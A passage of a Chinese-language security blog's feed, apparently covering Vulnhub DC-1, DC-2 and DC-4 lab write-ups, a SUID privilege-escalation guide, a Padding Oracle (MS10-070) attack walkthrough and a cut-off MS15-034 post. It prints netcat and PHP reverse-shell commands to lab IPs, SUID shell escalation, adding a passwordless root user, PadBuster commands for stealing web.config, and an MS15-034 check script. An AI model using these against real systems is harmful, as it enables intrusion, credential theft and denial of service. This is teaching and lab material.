3</h2><p>行吧，只能上最笨也是最直接的方法了，密码爆破。根据Web界面的提示，说明后台是admin用户，那就简单了。只需要爆破admin用户的密码即可，BurpSuite跑的有点慢，所以用hydra搞定了。</p><p><img src="/img/DC-4/DC-4-5.png"></p><p>登录进系统发现可以执行命令，刚开始以为做了防护，提交的仅仅是编号。结果使用BurpSuite抓包后发现还是直接提交命令。修改命令，回显可以成功执行。</p><p><img src="/img/DC-4/DC-4-6.png"></p><p><img src="/img/DC-4/DC-4-7.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>使用<code>nc -e /bin/bash 172.16.12.129 4444</code>反弹shell到Kali上。</p><p><img src="/img/DC-4/DC-4-8.png"></p><p>反弹回来的是一个非交互式的shell，通过<code>python -c &quot;import pty; pty.spawn(&#39;/bin/sh&#39;)&quot;</code>得到交互式shell。在&#x2F;home&#x2F;jim&#x2F;backups&#x2F;文件夹下有个old-passwords.bak文件，里面是一些密码。</p><p><img src="/img/DC-4/DC-4-9.png"></p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>利用上一步得到的密码文件爆破ssh端口。</p><p><img src="/img/DC-4/DC-4-10.png"></p><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>ssh登录靶机之后，在&#x2F;var&#x2F;mail文件夹下找到一封邮件，邮件中有Charles账户的密码。</p><p><img src="/img/DC-4/DC-4-11.png"></p><p>利用该密码可ssh登录Charles账户。</p><h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p>登录Charles账户后发现可以用sudo命令执行teehee命令，查看teehee命令用法。</p><p><img src="/img/DC-4/DC-4-12.png"></p><p>利用teehee命令向&#x2F;etc&#x2F;passwd中添加一个和root权限一样的无密码用户，这样就可以切换到root用户，在根目录下找到flag。</p><p><img src="/img/DC-4/DC-4-13.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> DC Series </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - DC-2 の Write-Up</title>
      <link href="/2019/11/19/DC-2/"/>
      <url>/2019/11/19/DC-2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.vulnhub.com/">Vulnhub</a>之DC系列靶机第二台<a href="http://www.five86.com/downloads/DC-2.zip">DC-2</a>的Write-up。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>老套路，第一步首先寻找靶机IP，<code>arp-scan -l</code>寻找“陌生”机器。</p><p><img src="/img/DC-2/DC-2-1.png"></p><p>然后扫描一下靶机开放端口，很奇怪，常用端口只开放了80（伏笔）。</p><p><img src="/img/DC-2/DC-2-2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>查看80端口，发现网站打不开。根据Nmap扫描加过的提示，发现需要在hosts文件里添加<code>172.16.12.128 dc-2</code>。成功访问网站之后，发现是Wordpress cms，并在flag界面找到第一个flag。</p><p><img src="/img/DC-2/DC-2-3.png"></p><p>根据第一个flag的提示，可能需要爆破网站后台登录名和密码。通过wpscan工具扫描网站并列举网站用户，找到admin、tom、jerry这3个用户。</p><p><img src="/img/DC-2/DC-2-4.png"></p><p><img src="/img/DC-2/DC-2-5.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>第一个flag的提示同时也告诉我们，密码可能在普通的字典中没有。更是提示我们利用cewl这个工具去生成本次爆破需要的字典。</p><p>使用<code>cewl http://dc-2/ &gt; dc2.txt</code>命令生成密码字典，然后用wpscan爆破admin、tom、jerry用户的密码，最终得到tom和jerry用户密码。</p><p><img src="/img/DC-2/DC-2-6.png"></p><p>尝试两个用户登录，果然如第一个flag提示那样，只有jerry用户可以登录后台，并在后台中发现flag2。</p><p><img src="/img/DC-2/DC-2-7.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>仔细阅读flag2的提示，原来这个靶机还有一个入口。那这个入口在哪呢？Step 1的伏笔就在这里，再对靶机进行全端口扫描，果然发现了第二个入口，7744端口的ssh服务。</p><p><img src="/img/DC-2/DC-2-8.png"></p><p>这时自然而然想到爆破出来的那两个账户是不是依然有用，特别是没能登录进后台的tom账户。尝试了一下，果然这次jerry账户无法登陆，tom账户可以成功ssh连接上靶机。</p><p><img src="/img/DC-2/DC-2-9.png"></p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>tom账户登陆之后发现几乎所有命令都不能使用，是一个严重受限制的rbash。多次尝试发现vi居然可以用，通过vi看到了第三个flag文件。</p><p><img src="/img/DC-2/DC-2-10.png"></p><p><img src="/img/DC-2/DC-2-11.png"></p><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>flag3好像又提示我们要切换到jerry用户，那只能再次尝试，su，sudo等等等等，全部没用。只能上网寻找如何跳出rbash限制，功夫不负有心人。踩了很多很多坑之后找到了有用的<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">帮助</a>。</p><p><img src="/img/DC-2/DC-2-12.png"></p><p>切换到jerry账户，然后找到了flag4文件。</p><p><img src="/img/DC-2/DC-2-13.png"></p><h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p>看到flag4文件的叙述，果然最后还是要到root文件夹下寻找最后一个flag。可是如何切换到root用户呢，老套路又来了，还记得DC-1靶机时说道的<a href="https://coldwave96.github.io/2019/11/15/suid/">SUID提权</a>么。</p><p>其实flag4文件最后已经给我们提示了，嘴上很无情，身体还是很诚实的嘛。</p><p>对的，就是通过git提权。</p><p><img src="/img/DC-2/DC-2-14.png"></p><p>拿到root权限之后，在&#x2F;root文件夹下找到最后一个flag。</p><p><img src="/img/DC-2/DC-2-15.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> DC Series </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux的SUID提权</title>
      <link href="/2019/11/15/suid/"/>
      <url>/2019/11/15/suid/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在&#x2F;etc&#x2F;shadow中，而&#x2F;etc&#x2F;shadow的权限为 ———-。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在&#x2F;bin&#x2F;passwd下，当我们执行这个命令后，就可以修改&#x2F;etc&#x2F;shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改&#x2F;etc&#x2F;passwd这个文件了。(命令：<code>chmod u+s  文件名</code>)</p><p><img src="/img/suid/suid1.png"></p><p>使用suid需要满足的几个条件:</p><ul><li><p>SUID只对可执行文件有效</p></li><li><p>调用者对该文件有执行权</p></li><li><p>在执行过程中，调用者会暂时获得该文件的所有者权限</p></li><li><p>该权限只在程序执行的过程中有效</p></li></ul><span id="more"></span><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>已知的可用来提权的linux可行性的文件列表如下：</p><ul><li><p>nmap</p></li><li><p>vim</p></li><li><p>find</p></li><li><p>bash</p></li><li><p>more</p></li><li><p>less</p></li><li><p>nano</p></li><li><p>cp</p></li></ul><p>以下命令可以发现系统上运行的所有SUID可执行文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>假设我们已经获得了某台服务器的shell，但是账户权限比较低。</p><p><img src="/img/suid/suid2.png"></p><p>使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>寻找满足提权条件的可执行文件，本次实验使用find。</p><p><img src="/img/suid/suid3.png"></p><p>执行命令<code>find flag4.txt -exec /bin/sh \;</code>，实现提权。</p><p><img src="/img/suid/suid4.png"></p><p>可以继续执行反弹shell的命令，最后反弹回来的shell也会是root权限，这里就不做演示了。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Penetration Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Strategy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - DC-1 の Write-Up</title>
      <link href="/2019/11/14/DC-1/"/>
      <url>/2019/11/14/DC-1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看到FreeBuf上有一篇关于<a href="http://www.five86.com/downloads/DC-1.zip">VulHub DC-1</a>靶机的教学，就自己下载了一台玩了一下。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先肯定要扫描一下靶机的IP地址，在Kali中用nmap扫描一下整个网段。</p><p><img src="/img/DC-1/DC-1-1.png"></p><p>172.16.12.134是Kali自己的地址，所以靶机的地址就是172.16.12.136了。然后再针对靶机扫描一下开放的端口和服务。</p><p><img src="/img/DC-1/DC-1-2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>访问了下80端口的服务，发现是一个Drupal的cms。没有发现Web服务上有什么可乘之机，用nikto也扫了一下网站，做为辅助判断，也没有任何进展。</p><p><img src="/img/DC-1/DC-1-3.png"></p><p>也用了Dirbuster探索了一下网站结构，找找有没有敏感文件，最终都一无所获。于是去百度上找了一下Drupal有什么漏洞，果不其然，找到一个CVE-2018-7600的远程代码执行漏洞，影响Drupal 6，7，8等多个子版本。正好nmap扫描时发现靶机上是Drupal 7，瞬间觉得找对了地方。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>第一反应当然是MSF走起，<code>search cve-2018-7600</code>果然有东西。</p><p><img src="/img/DC-1/DC-1-4.png"></p><p>MSF一通操作，so easy！</p><p><img src="/img/DC-1/DC-1-5.png"></p><p><img src="/img/DC-1/DC-1-6.png"></p><p>进入shell之后发现是一个非交互shell，想办法得到一个交互式shell。首先试了下php的反弹shell，执行命令<code>php -r &#39;$sock=fsockopen(&quot;172.16.12.134&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>可以回弹shell，但是输入命令没反应。只能换个法子，看了下系统环境，发现有Python 2.7的环境，利用下面的命令实现反弹shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/sh&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/DC-1/DC-1-7.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>发现www-data权限很低，接下来要进行提权操作。<code>uname -a</code>看了下系统版本，发现脏牛提权可能可以玩，但是不太好操作。最后选择了简单的<a href="https://coldwave96.github.io/2019/11/15/suid/">suid提权</a>。</p><p><img src="/img/DC-1/DC-1-8.png"></p><p><img src="/img/DC-1/DC-1-9.png"></p><p>提权成功，开始在靶机中寻找flag，在&#x2F;home&#x2F;flag4文件夹下发现flag4.txt文件。</p><p><img src="/img/DC-1/DC-1-10.png"></p><p>在&#x2F;var&#x2F;www文件夹下发现flag1.txt，就是在低权限用户www-data下发现的文件。</p><p><img src="/img/DC-1/DC-1-11.png"></p><p>根据提示去找站点的配置文件&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php，在文件中发现了flag2和数据库的帐号密码。</p><p><img src="/img/DC-1/DC-1-12.png"></p><p>连接数据库，在数据库中继续寻找信息。</p><p><img src="/img/DC-1/DC-1-13.png"></p><p>在users表里发现admin用户的信息。</p><p><img src="/img/DC-1/DC-1-14.png"></p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h3><p>接下来尝试破解或者修改admin密码，Drupal对数据库中用户密码的加密脚本为网站根目录下scripts文件夹下的<code>password-hash.sh</code>。根据加密脚本解密肯定是一种南辕北辙的做法，虽然地球是圆的，理论上可以做到。但是简单直接的思路是加密新的我们设定的密码，然后对数据库中的admin密码进行替换。(参考链接：<a href="http://drupalchina.cn/node/2128">http://drupalchina.cn/node/2128</a>)</p><p><img src="/img/DC-1/DC-1-15.png"></p><p>然后登陆Drupal，找到flag3。</p><p><img src="/img/DC-1/DC-1-16.png"></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution 2"></a>Solution 2</h3><p>MSF的exploitdb中关于Drupal也存在不少的利用脚本，其中针对Drupal 7的有一个添加一个和admin权限相同用户的脚本，通过这个脚本可以创建一个administrator账户。</p><p><img src="/img/DC-1/DC-1-17.png"></p><p>运行下面的命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://172.16.12.136 -u administrator -p 123456</span><br></pre></td></tr></table></figure><p><img src="/img/DC-1/DC-1-18.png"></p><p>同样的登陆Drupal，找到flag3。</p><p><img src="/img/DC-1/DC-1-19.png"></p><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>最后好剩下一个flag，我自己是完全没想到。根据WriteUp，查看靶机&#x2F;etc&#x2F;shadow文件发现系统存在一个flag4用户，然后爆破ssh密码可以发现该用户的弱密码orange，登录后可以找到flag4，然后通过flag4找到最后一个flag在&#x2F;root根目录下。</p><p>在root下也发现了这个flag，但是没有仔细看内容，所以放过了最后一个flag。</p><p><img src="/img/DC-1/DC-1-20.png"></p><p><img src="/img/DC-1/DC-1-21.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> DC Series </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASP.NET PaddingOracle漏洞（MS10-070）</title>
      <link href="/2019/11/13/MS10-070/"/>
      <url>/2019/11/13/MS10-070/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这是前两天的漏洞验证中发现的第二个有意思的古老的漏洞，算是做一个小科普。</p><p>微软在2010年9月17号发布了一个关于ASP.NET平台的安全漏洞公告，这个公告就是关于Padding Oracle攻击的，其实这个漏洞并不仅是ASP.NET才存在，而ASP.NET Padding Oracle这种说法引人注目的原因可能是由于微软官方的反应和其应用比较广泛吧。实际上Padding Oracle是一个攻击原理，这是一个普遍存在的安全漏洞，通过这个原理还可以攻击CAPTCHA、Ruby on Rails、Apache MyFaces、Sun Mojarra、JavaServer Faces等其他目标，甚至连OWASP提供给的企业维护安全的API工具包ESAPI都会受到这个攻击。</p><p>Padding Oracle攻击，在2010年由Black Hat、OWASP和White Hat Security三大安全组织联合发起的10大WEB黑客技术中排名中居于首位，由此对于它的威力也可见一斑。</p><span id="more"></span><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>ASP.NET由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。 虽然攻击者无法利用此漏洞来执行恶意攻击代码或直接提升他们的用户权限，但此漏洞可用于信息搜集，这些信息可用于进一步攻击受影响的系统。<br>说的简单点，就是这个漏洞不能直接getshell，但是理论上可以利用它读取网站上任意文件的源码，比如数据库配置文件。</p><h2 id="对称加密基础知识"><a href="#对称加密基础知识" class="headerlink" title="对称加密基础知识"></a>对称加密基础知识</h2><p>说到Padding Oracle攻击，就不得不先说说对称加密，在对称加密算法中，密文就是密钥加明文经过加密算法处理的结果。加密算法里面的加密是分块实施的，如DES, RC2等算法。每块固定n(8, 16, 32„)位，有余数的情况一般按照某种规则补足，就是所谓的Padding填充，如常用的PKCS #5规则（图一），就是根据最后一个数据块所缺少的长度来选择填充的内容。为了加强加密的效果，所以会把上一块的密文用来混淆下一块加密数据，以此类推，用来混淆第一块数据的是预先生成的IV（初始化向量）。</p><p><img src="/img/MS10-070/MS10-070-1.png" alt="图一"></p><p>另外为了保证针对同一明文和密钥的密文每次都不一样，Web应用中通常会随机生成IV，并将它附加在密文中进行传输。在解密时候解密算法回收密文中携带的IV，将密文逆向解密，拿到一个中间密文，然后使用IV逆向混淆此中间密文，随后检查Padding的合法性，最后返回明文信息。</p><h2 id="Padding-Oracle攻击"><a href="#Padding-Oracle攻击" class="headerlink" title="Padding Oracle攻击"></a>Padding Oracle攻击</h2><p>说实话，我第一眼看到Padding Oracle的时候还以为是关于oracle数据库的，不太明白为什么发现者取了个这样的名字，也许是为了调侃甲骨文oracle吧。</p><p>其实在这里的Padding是“填充”的意思，因为对于加密算法来说，它们是基于等长的“数据块”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节，而对于Rijndael算法来说则是16、24或32字节）。但是我们的输入数据长度是不规则的，因此必然需要进行“填充”才能形成完整的块，通过这种规则我们便可以根据填充的内容来得知填充的长度，以便在解密后去除填充的字节。</p><p>一个密文被解密时也是分段进行的，在解密完成之后算法会先检查是否符合规则，如果它的Padding填充方式不符合规则，那么表示输入数据有问题。对于解密的类库来说，往往便会抛出一个Padding Error异常，提示Padding不正确。而在这里Oracle是“神谕、提示”的意思，和经常听说的oracle数据库没有什么关系。</p><p>可以这样来理解Padding Oracle攻击——黑客只需要一个合法密文，即可通过不断向网站发送篡改过的密文（这个过程主要是构造IV的过程），观察是否有Padding异常错误提示，网站中的异常错误提示可能直接显示在网页当中，也可能只是HTTP状态码，如“200 - OK”是正确的，“500 - Internal Server Error”是错误的，根据两个不同的HTTP状态码做对比即可，而不需要其他任何详细信息。</p><p>如果有异常错误提示即可不断地给网站程序提供密文，让解密程序给出错误提示，再而不断地修正，从而最终获得混淆之前的中间密文。拿到中间密文之后，可以通过构造IV，使得中间密文被逆向混淆之后得到的明文为指定内容，从而达到攻击的目的。在这过程中Padding Oracle攻击并没有破解掉加密算法的密钥，也没有能力对任意密文做逆向解密，只是可以利用一个有效密文，生成一个解密后得到任意指定内容明文的伪造密文。</p><p>一般一次成功的攻击所需要的平均耗时不会超过3个小时，以一个8byte的IV构造为例，每个Byte最坏的情况需要尝试256次，总共是2048次。假设每次尝试的时间为5秒（HTTP响应时间），总共耗时在3个小时以内。</p><h2 id="利用工具及环境"><a href="#利用工具及环境" class="headerlink" title="利用工具及环境"></a>利用工具及环境</h2><p>该漏洞的利用工具为<a href="https://github.com/Coldwave96/PadBuster">PadBuster</a>，该漏洞利用工具运行环境为perl，需要在本机配置好perl脚本运行环境。本次我是在Kali上进行的漏洞验证，Kali自带perl环境，可通过<code>perl -v</code>命令查看本地perl版本，如图二所示。</p><p><img src="/img/MS10-070/MS10-070-2.png" alt="图二"></p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>寻找padding oracle漏洞目标，可以简单的通过Acunetix Web Vulnerability Scanner等WEB漏洞扫描器来扫描目标网站发现。</p><p><img src="/img/MS10-070/MS10-070-3.png" alt="图三"></p><p>另外最常用的方法就是Google hacking，通过<code>allinurl: &quot;WebResource.axd?d=&quot;</code>或者搜索Java的javax.crypto.BadPaddingException。再就是黑箱测试从网页的源文件中查找一些BASE64形式的字符串，猜测常见的分割符，如“–”，“|”或是“:”等等。</p><p>如果你有网站的源代码的话，也可以通过源代码审计来寻找padding oracle漏洞，如下表。</p><table><thead><tr><th align="center">编程语言</th><th align="center">漏洞关键字</th></tr></thead><tbody><tr><td align="center">C&#x2F;C++</td><td align="center">OpenSSL, Crypto++</td></tr><tr><td align="center">Python</td><td align="center">PyCrypto, M2Crypto</td></tr><tr><td align="center">.NET</td><td align="center">.NET Cryptography, Microsoft CryptoAPI</td></tr><tr><td align="center">Java</td><td align="center">Java Crypto Extension, BouncyCastle</td></tr></tbody></table><h2 id="利用Padding-Oracle进行攻击"><a href="#利用Padding-Oracle进行攻击" class="headerlink" title="利用Padding Oracle进行攻击"></a>利用Padding Oracle进行攻击</h2><p>利用Padding Oracle原理来攻击的方法是多种多样的，如可以破解验证码、解密JSF加密信息、解密ViewState信息、伪造管理员的cookie、甚至可以下载web.config配置文件等。这里就以读取web.config配置文件为例给大家演示一下。</p><p>配置好本地perl环境并下载好漏洞利用工具之后，执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl Padbuster.pl http://www.example.com/WebResource.axd?d=9MBwmxN6TLKjC8S3CdFGyw2 9MBwmxN6TLKjC8S3CdFGyw2 16 -encoding 3 -plaintext <span class="string">&quot;|||~/web.config&quot;</span></span><br></pre></td></tr></table></figure><p>执行结果如下图所示：</p><p><img src="/img/MS10-070/MS10-070-4.png"></p><p><img src="/img/MS10-070/MS10-070-5.png"></p><p>这样就得到了目标网站web.config的URL的加密地址encrypted_string，下面就该上<a href="https://github.com/Coldwave96/POC/blob/master/MS10-070-Web.config_bruter.pl">Webconfig Bruter.pl</a>继续填充并获取完整的访问地址了。执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl Web.config_bruter.pl http://www.example.com/WebResource.axd encrypted_string 16</span><br></pre></td></tr></table></figure><p>然后耐心等待，即可得到一串新的加密字符encrypted_string_new，使用浏览器访问下面的地址就可以访问网站的web.config文件了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/ScriptResource.axd?d=encrypted_string_new（注意是ScriptResource.axd）</span><br></pre></td></tr></table></figure><ul><li>More Info：<a href="https://v.youku.com/v_show/id_XNTI4OTc2NTc2.html?spm=a2h0j.11185381.listitem_page1.5!2~A">这里</a>有一个该漏洞的完整讲解利用视频，也许对你有帮助。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Vulnerabilities </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Padding Oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP.SYS远程执行代码漏洞（MS15-034 | CVE-2015-1635）</title>
      <link href="/2019/11/13/MS15-034/"/>
      <url>/2019/11/13/MS15-034/</url>
      
        <content type="html"><![CDATA[<p>这两天进行了一些漏洞验证的工作，遇到很多的很老的漏洞，但是基本都是没什么利用价值的信息泄露漏洞或者需要精心构造苛刻利用条件的漏洞。有趣的是发现了一个普遍存在的漏洞，时间也比较久远了，但是这个漏洞的危害性很高，而且在测试中发现基本该漏洞被漏扫设备或软件扫描出来准确度非常高。高危却又大范围存在，这个漏洞引起了我浓厚的兴趣。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在2015年4月安全补丁日，微软发布的众多安全更新中，修复了HTTP.sys中一处允许远程执行代码漏洞，编号为：CVE-2015-1635（MS15-034 ）。利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。根据公告显示，该漏洞对服务器系统造成了不小的影响，主要影响了包括Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2在内的主流服务器操作系统。</p><span id="more"></span><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="使用curl进行测试"><a href="#使用curl进行测试" class="headerlink" title="使用curl进行测试"></a>使用curl进行测试</h3><p>测试命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://xxxxxx -H <span class="string">&quot;Host: xxxxxx&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure><p>测试结果：</p><p><img src="/img/MS15-034/MS15-034-1.png"></p><h3 id="使用POC测试"><a href="#使用POC测试" class="headerlink" title="使用POC测试"></a>使用POC测试</h3><p>POC代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">identify_iis</span>(<span class="params">domain</span>):</span><br><span class="line"> </span><br><span class="line">    req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line"> </span><br><span class="line">    remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line"> </span><br><span class="line">        ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ms15_034_test</span>(<span class="params">domain</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;漏洞已修复&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">    usr_domain = raw_input(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">    identify_iis(usr_domain)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="MSF读取服务器内存"><a href="#MSF读取服务器内存" class="headerlink" title="MSF读取服务器内存"></a>MSF读取服务器内存</h3><p>MSF中存在该漏洞利用模块，可以读取服务器内存数据，截图如下：</p><p><img src="/img/MS15-034/MS15-034-2.png"></p><h3 id="MSF实现DOS攻击"><a href="#MSF实现DOS攻击" class="headerlink" 